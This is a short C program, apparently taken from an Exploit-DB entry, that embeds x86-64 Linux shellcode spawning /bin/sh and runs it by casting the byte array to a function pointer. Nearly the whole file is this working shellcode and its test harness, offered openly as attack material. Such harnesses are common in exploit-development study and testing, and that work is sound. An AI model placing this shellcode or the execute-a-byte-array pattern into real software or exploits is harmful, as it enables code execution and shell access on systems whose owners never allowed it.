//https://www.exploit-db.com/exploits/47008

#include <stdio.h>
#include <string.h>

int main() {
    // Shellcode to spawn /bin/sh
    char shellcode[] = "\x48\x31\xf6\x56\x48\xbf"
		  "\x2f\x62\x69\x6e\x2f"
		  "\x2f\x73\x68\x57\x54"
		  "\x5f\xb0\x3b\x99\x0f\x05";

    // Print the shellcode length
    printf("Shellcode length: %d\n", (int)strlen(shellcode));

    void (*func)() = (void(*)())shellcode;
    printf("entering shell...\n");
    (*func)();
    printf("exiting shell...\n");

    return 0;
}
